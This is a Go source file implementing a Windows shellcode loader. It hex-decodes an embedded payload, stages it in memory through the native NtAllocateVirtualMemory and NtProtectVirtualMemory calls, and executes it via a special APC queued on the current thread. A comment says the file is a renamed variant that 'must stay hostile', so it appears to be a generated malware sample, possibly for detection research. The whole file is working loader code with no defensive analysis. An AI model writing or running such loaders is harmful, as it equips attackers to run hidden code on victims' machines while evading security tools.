package main

// Variant of the native-APC shellcode staging technique with renamed
// identifiers and a different embedded payload. Must stay hostile: hex
// payload staged through NtAllocateVirtualMemory/NtProtectVirtualMemory and
// entered through an APC queued on the current thread.
import (
	"encoding/hex"
	"log"

	"golang.org/x/sys/windows"
	"unsafe"
)

const apcSpecial = 1

func main() {
	payload, _ := hex.DecodeString("4831c04881ec00010000488d05f32a0bff488d0d0d0000004883c130488bc22d0a5e97fbd7a14831c9b857010000e22b4883c4285de66f41585d4158c1e20585c00f850d0000004831c9c3")

	mod := windows.NewLazySystemDLL("ntdll.dll")
	allocProc := mod.NewProc("NtAllocateVirtualMemory")
	protProc := mod.NewProc("NtProtectVirtualMemory")
	queueProc := mod.NewProc("NtQueueApcThreadEx")

	var region uintptr
	var handle = uintptr(0xffffffffffffffff)
	var prevProt uintptr
	size := uintptr(len(payload))

	_, _, err := allocProc.Call(
		handle,
		uintptr(unsafe.Pointer(&region)),
		0,
		uintptr(unsafe.Pointer(&size)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("alloc failed:", err)
	}
	for i := range payload {
		*(*byte)(unsafe.Pointer(region + uintptr(i))) = payload[i]
	}

	_, _, err = protProc.Call(
		handle,
		uintptr(unsafe.Pointer(&region)),
		uintptr(unsafe.Pointer(&size)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&prevProt)),
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("protect failed:", err)
	}

	self := windows.CurrentThread()
	_, _, err = queueProc.Call(
		uintptr(self),
		uintptr(apcSpecial),
		region,
		0,
		0,
		0,
	)
	if err.Error() != "The operation completed successfully." {
		log.Fatal("queue failed:", err)
	}
}
